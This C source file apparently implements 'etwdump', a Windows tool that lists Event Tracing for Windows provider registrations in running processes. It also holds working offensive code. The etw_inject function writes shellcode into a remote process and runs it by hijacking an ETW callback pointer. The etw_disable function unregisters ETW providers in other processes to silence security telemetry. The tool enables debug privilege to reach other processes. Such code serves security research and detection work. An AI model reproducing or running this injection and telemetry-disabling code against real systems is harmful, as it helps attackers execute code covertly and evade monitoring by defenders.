/**
  Copyright © 2020 Odzhan. All Rights Reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are
  met:

  1. Redistributions of source code must retain the above copyright
  notice, this list of conditions and the following disclaimer.

  2. Redistributions in binary form must reproduce the above copyright
  notice, this list of conditions and the following disclaimer in the
  documentation and/or other materials provided with the distribution.

  3. The name of the author may not be used to endorse or promote products
  derived from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
  POSSIBILITY OF SUCH DAMAGE. */

#include "etw.h"

#pragma comment(lib, "user32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "version.lib")

#define ETW_OPT_SEARCH  (1 << 1)
#define ETW_OPT_DISABLE (1 << 2)
#define ETW_OPT_INJECT  (1 << 3)
#define ETW_OPT_TRACERS (1 << 4)

DWORD prov_cnt = 0, disabled_cnt = 0;

// Convert a Native NT path to MS-DOS path
VOID native2dos(WCHAR native[], WCHAR dos[]) {
    HANDLE            hf;
    NTSTATUS          nts;
    OBJECT_ATTRIBUTES oa;
    UNICODE_STRING    us;
    IO_STATUS_BLOCK   iosb;
    
    RtlInitUnicodeString(&us, native);
    InitializeObjectAttributes(&oa, &us, OBJ_CASE_INSENSITIVE, NULL, NULL);
      
    nts = NtOpenFile(
      &hf, FILE_GENERIC_READ,
      &oa, &iosb, FILE_SHARE_READ, 0);
      
    GetFinalPathNameByHandle(hf, dos, MAX_PATH, VOLUME_NAME_DOS);
    NtClose(hf);
}

// Read description of file from version information
PWCHAR get_file_description(WCHAR path[]) {
    DWORD            len, infolen, hinfo;
    WCHAR            buf[512];
    LPVOID           info, value;
    VS_FIXEDFILEINFO *finfo;
    static WCHAR     desc[MAX_PATH];
    WCHAR            dospath[MAX_PATH]={0};
    
    native2dos(path, dospath);
    
    infolen = GetFileVersionInfoSize(dospath, &hinfo);
    if(!infolen) return L"N/A";
    
    // allocate memory
    info = malloc(infolen);
    
    GetFileVersionInfo(dospath, hinfo, infolen, info);
    
    VerQueryValue(info, L"\\", (LPVOID*)&finfo, &len);
    
    // query languages
    struct LANGANDCODEPAGE {
        WORD wLanguage;
        WORD wCodePage;
    } *lpTranslate;

    UINT cbTranslate = 0;
    
    VerQueryValue(info, 
      L"\\VarFileInfo\\Translation", 
      (LPVOID*)&lpTranslate, &cbTranslate);

    // use first in list
    swprintf(buf, 
      ARRAYSIZE(buf), 
      L"\\StringFileInfo\\%04x%04x\\FileDescription", 
      lpTranslate[0].wLanguage, 
      lpTranslate[0].wCodePage);
      
    VerQueryValue(info, buf, &value, &len);
    
    if(value == NULL) return L"N/A";
    
    lstrcpy(desc, value);
    free(info);
    
    return desc;
}

// Convert provider id (GUID) to display name
BSTR etw_id2name(OLECHAR *id) {
    HRESULT                   hr;
    static ITraceDataProvider *prov = NULL;
    static BSTR               name = NULL;
    static BOOL               init = FALSE;
    
    if(!init) {
      hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
      if(hr == S_OK) {
        hr = CoCreateInstance(
          &CLSID_TraceDataProvider,
          0,
          CLSCTX_INPROC_SERVER,
          &IID_ITraceDataProvider,
          (LPVOID*)&prov);
        if(hr == S_OK) init = TRUE;
      }
    }
    
    // query details for the provider GUID
    hr = prov->lpVtbl->Query(prov, id, NULL);
    
    if(hr == S_OK) {
      // read the display name
      hr = prov->lpVtbl->get_DisplayName(prov, &name);
    }
    //prov->lpVtbl->Release(prov);
    
    return hr == S_OK ? name : L"Unknown";
}

// Display information about an ETW registration entry
VOID etw_reg_info(
    HANDLE              hp, 
    PRTL_BALANCED_NODE  node,
    PETW_USER_REG_ENTRY re, 
    int                 tabs) 
{
    SIZE_T       rd;
    WCHAR        cbfile[MAX_PATH], ctfile[MAX_PATH];
    BYTE         buffer[sizeof(SYMBOL_INFO)+MAX_SYM_NAME*sizeof(WCHAR)];
    PSYMBOL_INFO pSymbol=(PSYMBOL_INFO)buffer;
    OLECHAR      id[40];
    ULONG_PTR    disp;
    
    // increase number of providers found/displayed
    prov_cnt++;
    
    wprintf(L"%*sNode        : %p\n", 
      tabs, L"\t", (PVOID)node);
      
    StringFromGUID2(&re->ProviderId, id, sizeof(id));
    wprintf(L"%*sGUID        : %s (%s)\n", 
      tabs, L"\t", id, etw_id2name(id));
    
    ZeroMemory(cbfile, ARRAYSIZE(cbfile));
    
    GetMappedFileName(hp, 
      (LPVOID)re->Callback, cbfile, MAX_PATH);
    
    wprintf(L"%*sDescription : %s\n", 
      tabs, L"\t", get_file_description(cbfile));
      
    PathStripPath(cbfile);
     
    wprintf(L"%*sCallback    : %p : %s", 
      tabs, L"\t", re->Callback, cbfile);
    
    pSymbol->SizeOfStruct = sizeof(SYMBOL_INFO);
    pSymbol->MaxNameLen   = MAX_SYM_NAME;
    
    if(SymFromAddr(hp, (ULONG_PTR)re->Callback, NULL, pSymbol)) {
      wprintf(L"!%hs", pSymbol->Name);
    }
    putchar('\n');

    // display context          
    ZeroMemory(ctfile, ARRAYSIZE(ctfile));
    
    GetMappedFileName(hp, 
      (LPVOID)re->CallbackContext, ctfile, MAX_PATH);
     
    PathStripPath(ctfile);

    wprintf(L"%*sContext     : %p : %s", 
      tabs, L"\t", (PVOID)re->CallbackContext,  ctfile);
    
    pSymbol->SizeOfStruct = sizeof(SYMBOL_INFO);
    pSymbol->MaxNameLen   = MAX_SYM_NAME;
    
    if(SymFromAddr(hp, (DWORD64)re->CallbackContext, NULL, pSymbol)) {
      wprintf(L"!%hs", pSymbol->Name);
    }
    putchar('\n');
    
    wprintf(L"%*sIndex       : %i\n", 
      tabs, L"\t", re->RegIndex);    
      
    wprintf(L"%*sType        : %i (0x%x)\n", 
      tabs, L"\t", re->RegType,re->RegType);
      
    // display the registration handle that
    // can be used with EtwEventUnregister
    wprintf(L"%*sReg Handle  : %p\n",
      tabs, L"\t", 
      (PVOID)((ULONG64)node | (ULONG64)re->RegIndex << 48));
      
    wprintf(L"%*sThread      : %p\n",
      tabs, L"\t",
      (PVOID)re->Thread);
      
    wprintf(L"%*sReplyHandle : %p\n\n",
      tabs, L"\t",
      (PVOID)re->ReplyHandle);
}

// dump nodes
VOID etw_dump_nodes(
    HANDLE             hp, 
    PRTL_BALANCED_NODE node, 
    PWCHAR             dll,
    int                opt,    
    int                tabs) 
{
    SIZE_T             rd;
    BOOL               bRead;
    ETW_USER_REG_ENTRY re;
    WCHAR              path[MAX_PATH];
    
    if(node == NULL) return;
    
    // read ETW_USER_REG_ENTRY into local memory
    bRead = ReadProcessMemory(
      hp, (PBYTE)node, &re, sizeof(re), &rd);
    if(!bRead) return;
      
    // filter by DLL?
    if(dll != NULL) {
      GetMappedFileName(hp, 
        (LPVOID)re.Callback, 
        path, MAX_PATH);
        
      if(StrStrI(path, dll) != NULL) {
        etw_reg_info(hp, node, &re, tabs + 1);
      }
    } else {
      etw_reg_info(hp, node, &re, tabs + 1);
    }
    
    etw_dump_nodes(hp, re.RegList.Children[0], dll, opt, tabs + 1);
    etw_dump_nodes(hp, re.RegList.Children[1], dll, opt, tabs + 1);
}

VOID etw_search_process(
    HANDLE          hp, 
    PPROCESSENTRY32 pe32,
    LPVOID          etw,
    PWCHAR          dll,
    int             opt)
{
    SIZE_T      rd;
    RTL_RB_TREE tree;
    CHAR        path[MAX_PATH];
    
    SymSetOptions(SYMOPT_DEFERRED_LOADS);
    SymInitialize(hp, NULL, TRUE);
    
    if(SymGetSearchPath(hp, path, MAX_PATH)) {
      printf("Search path for symbols : %s\n", path);
    }
    
    // read EtwpRegistrationTable into memory
    ReadProcessMemory(
      hp, (PBYTE)etw, (PBYTE)&tree, 
      sizeof(RTL_RB_TREE), &rd);
    
    wprintf(L"*********************************************\n");
    wprintf(L"  [ EtwpRegistrationTable for %ws:%i found at %p\n\n", 
      pe32->szExeFile, pe32->th32ProcessID, etw);
      
    // dump nodes
    etw_dump_nodes(hp, tree.Root, dll, opt, 0);
    
    SymCleanup(hp);
}

// read the VA of ETW registration table in NTDLL data section
LPVOID etw_get_table_va(VOID) {
    LPVOID                m, va = NULL;
    PIMAGE_DOS_HEADER     dos;
    PIMAGE_NT_HEADERS     nt;
    PIMAGE_SECTION_HEADER sh;
    DWORD                 i, cnt;
    PULONG_PTR            ds;
    PRTL_RB_TREE          rbt;
    PETW_USER_REG_ENTRY   re;
    
    m   = GetModuleHandle(L"ntdll.dll");
    dos = (PIMAGE_DOS_HEADER)m;  
    nt  = RVA2VA(PIMAGE_NT_HEADERS, m, dos->e_lfanew);  
    sh  = (PIMAGE_SECTION_HEADER)((LPBYTE)&nt->OptionalHeader + 
            nt->FileHeader.SizeOfOptionalHeader);
    
    // locate the .data segment, save VA and number of pointers
    for(i=0; i<nt->FileHeader.NumberOfSections; i++) {
      if(*(PDWORD)sh[i].Name == *(PDWORD)".data") {
        ds  = RVA2VA(PULONG_PTR, m, sh[i].VirtualAddress);
        cnt = sh[i].Misc.VirtualSize / sizeof(ULONG_PTR);
        break;
      }
    }
    
    // For each pointer minus one
    for(i=0; i<cnt - 1; i++) {
      rbt = (PRTL_RB_TREE)&ds[i];
      // Skip pointers that aren't heap memory
      if(!IsHeapPtr(rbt->Root)) continue;
      
      // It might be the registration table.
      // Check if the callback is code
      re = (PETW_USER_REG_ENTRY)rbt->Root;
      if(!IsCodePtr(re->Callback)) continue;
      
      // Save the virtual address and exit loop
      va = &ds[i];
      break;
    }
    return va;
}

// search for a provider in a process
PRTL_BALANCED_NODE etw_get_reg(
    HANDLE              hp, 
    LPVOID              etw, 
    PWCHAR              prov, 
    PETW_USER_REG_ENTRY re) 
{
    RTL_RB_TREE        tree;
    SIZE_T             rd;
    PRTL_BALANCED_NODE node;
    int                cmp;
    GUID               id;
    HRESULT            hr;
    
    hr = IIDFromString(prov, &id);
    if(hr != S_OK) {
      xstrerror(L"IIDFromString(%s)", prov);
      return NULL;
    }
    
    // read EtwpRegistrationTable into memory
    ReadProcessMemory(
      hp, (PBYTE)etw, (PBYTE)&tree, 
      sizeof(RTL_RB_TREE), &rd);
    
    node = tree.Root;
    
    while(node != NULL) {
      // read registration entry
      ReadProcessMemory(
        hp, (PBYTE)node, re, 
        sizeof(ETW_USER_REG_ENTRY), 
        &rd);
      
      // compare provider ids
      cmp = memcmp(&id, &re->ProviderId, sizeof(GUID));
      
      // equal?
      if(cmp == 0) {
        break;
      } else if(cmp < 0) {
        node = re->RegList.Children[0];
      } else {
        node = re->RegList.Children[1];
      }
    }
    return node;
}

// inject shellcode into process using ETW registration entry
BOOL etw_inject(DWORD pid, PWCHAR path, PWCHAR prov) {
    RTL_RB_TREE             tree;
    PVOID                   etw, pdata, cs, callback;
    HANDLE                  hp;
    SIZE_T                  rd, wr;
    ETW_USER_REG_ENTRY      re;
    PRTL_BALANCED_NODE      node;
    OLECHAR                 id[40];
    TRACEHANDLE             ht;
    DWORD                   plen, bufferSize;
    PWCHAR                  name;
    PEVENT_TRACE_PROPERTIES prop;
    BOOL                    status = FALSE;
    const wchar_t           etwname[]=L"etw_injection\0";
    
    if(path == NULL) return FALSE;
    
    // try read shellcode into memory
    plen = readpic(path, &pdata);
    if(plen == 0) { 
      wprintf(L"  [ ERROR: Unable to read shellcode from %s\n", path); 
      return FALSE; 
    }
    
    // try obtain the VA of ETW registration table
    etw = etw_get_table_va();
    
    if(etw == NULL) {
      wprintf(L"  [ ERROR: Unable to obtain address of ETW Registration Table.\n");
      return FALSE;
    }
    
    wprintf(L"*********************************************\n");
    wprintf(L"  [ The EtwpRegistrationTable in %s:%i was found at %p\n\n", 
      pid2name(pid), pid, etw);
    
    // try open target process
    hp = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    
    if(hp == NULL) {
      xstrerror(L"OpenProcess(%ld)", pid);
      return FALSE;
    }
    
    // use (Microsoft-Windows-User-Diagnostic) unless specified
    
    node = etw_get_reg(
      hp, 
      etw, 
      prov != NULL ? prov : L"{305FC87B-002A-5E26-D297-60223012CA9C}", 
      &re);
    
    if(node != NULL) {
      // convert GUID to string and display name
      StringFromGUID2(&re.ProviderId, id, sizeof(id));
      name = etw_id2name(id);
        
      wprintf(L"  [ Address of remote node  : %p\n", (PVOID)node);
      wprintf(L"  [ Using %s (%s)\n", id, name);
      
      // allocate memory for shellcode
      cs = VirtualAllocEx(
        hp, NULL, plen, 
        MEM_COMMIT | MEM_RESERVE, 
        PAGE_EXECUTE_READWRITE);
        
      if(cs != NULL) {
        wprintf(L"  [ Address of old callback : %p\n", re.Callback);
        wprintf(L"  [ Address of new callback : %p\n", cs);
        
        // write shellcode
        WriteProcessMemory(hp, cs, pdata, plen, &wr);
          
        // initialize trace
        bufferSize = sizeof(EVENT_TRACE_PROPERTIES) + 
                     sizeof(etwname) + 2;

        prop = (EVENT_TRACE_PROPERTIES*)LocalAlloc(LPTR, bufferSize);
        prop->Wnode.BufferSize    = bufferSize;
        prop->Wnode.ClientContext = 2;
        prop->Wnode.Flags         = WNODE_FLAG_TRACED_GUID;
        prop->LogFileMode         = EVENT_TRACE_REAL_TIME_MODE;
        prop->LogFileNameOffset   = 0;
        prop->LoggerNameOffset    = sizeof(EVENT_TRACE_PROPERTIES);
        
        if(StartTrace(&ht, etwname, prop) == ERROR_SUCCESS) {
          // save callback
          callback = re.Callback;
          re.Callback = cs;
          
          // overwrite existing entry with shellcode address
          WriteProcessMemory(hp, 
            (PBYTE)node + offsetof(ETW_USER_REG_ENTRY, Callback), 
            &cs, sizeof(ULONG_PTR), &wr);
          
          // trigger execution of shellcode by enabling trace
          if(EnableTraceEx(
            &re.ProviderId, NULL, ht,
            1, TRACE_LEVEL_VERBOSE, 
            (1 << 16), 0, 0, NULL) == ERROR_SUCCESS) 
          {
            status = TRUE;
          }
          
          // restore callback
          WriteProcessMemory(hp, 
            (PBYTE)node + offsetof(ETW_USER_REG_ENTRY, Callback), 
            &callback, sizeof(ULONG_PTR), &wr);

          // disable tracing
          ControlTrace(ht, etwname, prop, EVENT_TRACE_CONTROL_STOP);
        } else {
          xstrerror(L"StartTrace");
        }
        LocalFree(prop);
        VirtualFreeEx(hp, cs, 0,  MEM_RELEASE);
      }        
    } else {
      wprintf(L"  [ ERROR: Unable to get registration entry.\n");
    }
    CloseHandle(hp);
    return status;
}

typedef NTSTATUS (NTAPI *RtlCreateUserThread_t) (
    IN  HANDLE ProcessHandle,
    IN  PSECURITY_DESCRIPTOR SecurityDescriptor OPTIONAL,
    IN  BOOLEAN CreateSuspended,
    IN  ULONG StackZeroBits,
    IN  OUT  PULONG StackReserved,
    IN  OUT  PULONG StackCommit,
    IN  PVOID StartAddress,
    IN  PVOID StartParameter OPTIONAL,
    OUT PHANDLE ThreadHandle,
    OUT PCLIENT_ID ClientID);

typedef ULONG (WINAPI *EventUnregister_t)(REGHANDLE RegHandle);

typedef struct _disable_ctx {
    REGHANDLE         RegHandle;
    EventUnregister_t EventUnregister;
    ULONG             Result;
} disable_ctx;
  
// disable ETW provider using code stub
DWORD WINAPI DisableStub(LPVOID lpParameter) {
    disable_ctx *ctx;
    
    ctx = (disable_ctx*)lpParameter;
    
    // unregister the provider
    ctx->Result = ctx->EventUnregister(ctx->RegHandle);
    return 0;
}

int DisableStubEnd(int a, int b) { return a + b; }

BOOL etw_disable(
    HANDLE             hp,
    PRTL_BALANCED_NODE node,
    USHORT             index) 
{
    HMODULE               m;
    HANDLE                ht;
    RtlCreateUserThread_t pRtlCreateUserThread;
    CLIENT_ID             cid;
    NTSTATUS              nt=~0UL;
    REGHANDLE             RegHandle;
    EventUnregister_t     pEtwEventUnregister;
    ULONG                 Result;
    
    // resolve address of API for creating new thread
    m = GetModuleHandle(L"ntdll.dll");
    
    pRtlCreateUserThread = (RtlCreateUserThread_t)
        GetProcAddress(m, "RtlCreateUserThread");
        
    pEtwEventUnregister = (EventUnregister_t)
        GetProcAddress(m, "EtwEventUnregister");
    
    // create registration handle    
    RegHandle           = (REGHANDLE)((ULONG64)node | (ULONG64)index << 48);

    // execute API in remote process
    printf("  [ Executing EventUnregister in remote process.\n");
    nt = pRtlCreateUserThread(hp, NULL, FALSE, 0, NULL, 
      NULL, pEtwEventUnregister, (PVOID)RegHandle, &ht, &cid);

    printf("  [ NTSTATUS is %lx\n", nt);
    WaitForSingleObject(ht, INFINITE);
    
    // read result of EtwEventUnregister
    GetExitCodeThread(ht, &Result);
    CloseHandle(ht);
    
    SetLastError(Result);
    
    if(Result != ERROR_SUCCESS) {
      xstrerror(L"etw_disable");
      return FALSE;
    }
    disabled_cnt++; 
    return TRUE;
}

// search system for providers. 
// filter by process id, dll or provider id
VOID etw_search_system(DWORD pid, PWCHAR dll, PWCHAR prov, int opt) {
    HANDLE             ss;
    PROCESSENTRY32     pe;
    HANDLE             hp;
    ULONG_PTR          ptr;
    SIZE_T             rd;
    LPVOID             etw;
    ETW_USER_REG_ENTRY re;
    PRTL_BALANCED_NODE node;
    
    etw = etw_get_table_va();
    
    if(etw == NULL) {
      wprintf(L"  [ ERROR: Unable to resolve address of ETW registration table.\n");
      return;
    }
    
    ss = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if(ss == INVALID_HANDLE_VALUE) return;
    
    pe.dwSize = sizeof(PROCESSENTRY32);

    if(Process32First(ss, &pe)){
      do {
        // skip system
        if(pe.th32ProcessID <= 4) continue;
        
        // if filtering by process id, skip entries that don't match
        if(pid != 0 && pe.th32ProcessID != pid) continue;
        
        // try open process
        hp = OpenProcess(
          PROCESS_ALL_ACCESS, 
          FALSE, 
          pe.th32ProcessID);
          
        if(hp != NULL) {
          // filter by provider?
          if(prov != NULL) {
            // try read registration entry from process
            node = etw_get_reg(hp, etw, prov, &re);
            if(node != NULL) {
              wprintf(L"*********************************************\n");
              wprintf(L"  [ Provider found in %ws:%i at %p\n\n", 
                pe.szExeFile, pe.th32ProcessID, (LPVOID)node);
      
              // show contents of it
              etw_reg_info(hp, node, &re, 0);
              // disable it?
              if(opt & ETW_OPT_DISABLE) {
                wprintf(L"  [ Tracing disabled: %s\n",
                  etw_disable(hp, node, re.RegIndex) ? L"OK" : L"FAILED");
              }
            }
          } else {
            etw_search_process(hp, &pe, etw, dll, opt);
          }
          CloseHandle(hp);
        } else {
          xstrerror(L"%s:%i", pe.szExeFile, pe.th32ProcessID);
        }
      } while(Process32Next(ss, &pe));
    }
    CloseHandle(ss);
}

/* 45d8cccd-539f-4b72-a8b7-5c683142609a */

GUID ALPCGuid = { 0x45d8cccd, 0x539f, 0x4b72, 0xa8, 0xb7, 0x5c, 0x68, 0x31, 0x42, 0x60, 0x9a };

typedef struct _EVENT_CALLBACK_ENTRY {
    LIST_ENTRY ListHead;
    GUID       ProviderId;
    PVOID      Callback;
} EVENT_CALLBACK_ENTRY, *PEVENT_CALLBACK_ENTRY;

void PeventCallback(PEVENT_TRACE pEvent) {
}

PWCHAR get_mapped_file(HANDLE hp, PVOID address) {
    static WCHAR path[MAX_PATH];
    ZeroMemory(path, sizeof(path));
    
    GetMappedFileName(hp, address, path, MAX_PATH);
    return path;
}

PVOID GetTraceCallbackList(VOID) {
    PIMAGE_DOS_HEADER     dos;
    PIMAGE_NT_HEADERS     nt;
    PIMAGE_SECTION_HEADER sh;
    HMODULE               m;
    BOOL                  found = FALSE;
    DWORD                 i, cnt;
    PULONG_PTR            ds;
    PEVENT_CALLBACK_ENTRY pce;

    // install our callback
    SetTraceCallback(&ALPCGuid, PeventCallback);
    
    // now try find in list
    m   = LoadLibrary(L"sechost");
    dos = (PIMAGE_DOS_HEADER)m;  
    nt  = RVA2VA(PIMAGE_NT_HEADERS, m, dos->e_lfanew);  
    sh  = (PIMAGE_SECTION_HEADER)((LPBYTE)&nt->OptionalHeader + 
            nt->FileHeader.SizeOfOptionalHeader);
    
    // locate the .data segment, save VA and number of pointers
    for(i=0; i<nt->FileHeader.NumberOfSections; i++) {
      if(*(PDWORD)sh[i].Name == *(PDWORD)".data") {
        ds  = RVA2VA(PULONG_PTR, m, sh[i].VirtualAddress);
        cnt = sh[i].Misc.VirtualSize / sizeof(ULONG_PTR);
        break;
      }
    }
    
    // Find handler in section
    for(i=0; i<cnt - 1; i++) {
      if(!IsHeapPtr((PVOID)ds[i])) continue;
      pce = (PEVENT_CALLBACK_ENTRY)ds[i];
      if(pce->Callback != PeventCallback) continue;
      found = TRUE;
      break;
    }
    
    RemoveTraceCallback(&ALPCGuid);
    
    // if found, return the pointer to list
    return found ? &ds[i] : NULL;   
}

void dump_tracers(HANDLE hp, PVOID va, DWORD pid, PWCHAR proc) {
    LIST_ENTRY           ecl;
    EVENT_CALLBACK_ENTRY ece;
    PVOID                ptr;
    SIZE_T               rd;
    OLECHAR              id[40];
    
    // read list entry
    ReadProcessMemory(
      hp, va, &ecl, 
      sizeof(ecl), &rd);
    
    if(rd != sizeof(ecl)) return;
    
    ptr = ecl.Flink;
    if(ptr == va) return;
    
    printf("TraceCallbackList : %p : %ws [%i]\n", va, proc, pid);

    for(;;) {
      if(ptr == va) break;
      
      ReadProcessMemory(
        hp, ptr, &ece, 
        sizeof(ece), &rd);
      
      if(rd != sizeof(ece)) break;
      
      StringFromGUID2(&ece.ProviderId, id, sizeof(id));
      printf("ProviderId : %ws (%ws)\n", id, etw_id2name(id));
      
      ptr = ece.Callback;
      printf("Callback   : %p : %ws\n", ptr, get_mapped_file(hp, ptr)); 
    
      ptr = (PVOID)ece.ListHead.Flink;
    }
    putchar('\n');
}

void scan_tracers(DWORD pid) {
    HANDLE         ss;
    PROCESSENTRY32 pe;
    HANDLE         hp;
    PVOID          va;
    
    va = GetTraceCallbackList();
    
    ss = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if(ss == INVALID_HANDLE_VALUE) return;
    
    pe.dwSize = sizeof(PROCESSENTRY32);

    if(Process32First(ss, &pe)){
      do {
        // skip system
        if(pe.th32ProcessID <= 4) continue;
        
        // if filtering by process id, skip entries that don't match
        if(pid != 0 && pe.th32ProcessID != pid) continue;
        
        // try open process
        hp = OpenProcess(
          PROCESS_ALL_ACCESS, 
          FALSE, 
          pe.th32ProcessID);
          
        if(hp != NULL) {
          dump_tracers(hp, va, pe.th32ProcessID, pe.szExeFile);
          
          CloseHandle(hp);
        }
      } while(Process32Next(ss, &pe));
    }
    CloseHandle(ss);
}

void usage(void) {
    wprintf(L"usage: etwdump [options] <process>\n\n");
    wprintf(L"  -i <file>    Inject shellcode into remote process (must use same prototype as ETW callback)\n");
    wprintf(L"  -d           Disable providers.\n");
    wprintf(L"  -m <dll>     Filter by DLL.\n");
    wprintf(L"  -p <guid>    Filter by provider.\n");
    putchar('\n');
    
    exit(0);
}

int wmain(int argc, WCHAR *argv[]) {
    WCHAR   *prov = NULL, 
            *file = NULL, 
            *dll = NULL, 
            *process = NULL;
    int     i, pid=0, opt = ETW_OPT_SEARCH;
    
    puts("\n  [ ETW Registration Dumper. Copyright (c) Odzhan\n");
    
    for(i=1; i<=argc-1; i++) {
      // is this a switch?
      if(argv[i][0]==L'/' || argv[i][0]==L'-'){
        // check it out
        switch(argv[i][1]) {
          // try disable provider?
          case L'd':
            opt |= ETW_OPT_DISABLE;
            break;
          // inject code?
          case L'i':
            opt |= ETW_OPT_INJECT;
            file = argv[++i];
            break;
          // search process
          case L's':
            opt |= ETW_OPT_SEARCH;
            break;
          // filter by provider id
          case L'p':
            prov = argv[++i];
            break;
          // filter by module/DLL
          case L'm':
            dll = argv[++i];
            break;
          // list tracers
          case L't':
            opt |= ETW_OPT_TRACERS;
            break;
          // help
          case L'?':
          case L'h':
          default:
            usage();
            break;
        }
      } else if (process==NULL) {
        process = argv[i];
      }
    }

    // target process specified?
    if(process != NULL) {
      pid = name2pid(process);
      if(pid == 0) pid = wcstoull(process, NULL, 10);
      if(pid == 0) {
        wprintf(L"  [ ERROR: Unable to resolve pid for \"%s\".\n", process);
        return -1;
      }
    }
    // injection specified, but no file or target process supplied?
    if ((opt & ETW_OPT_INJECT) && (file == NULL || pid == 0)) {
      wprintf(L"  [ ERROR: No shellcode or process specified for injection.\n");
      return 0;
    }
    
    // try enable debug privilege
    if(!SetPrivilege(SE_DEBUG_NAME, TRUE)) {
      wprintf(L"  [ WARNING: Failed to enable debugging privilege.\n");
    }
    
    // inject code?
    if(opt & ETW_OPT_INJECT) {
      wprintf(L"  [ STATUS: %s.\n", 
        etw_inject(pid, file, prov) ? L"complete" : L"failed");
    } else {
      // perform a search or disable providers
      etw_search_system(pid, dll, prov, opt);
      
      wprintf(L"  [ Found %i providers that meet your criteria.\n", prov_cnt);
    }
    return 0;
}
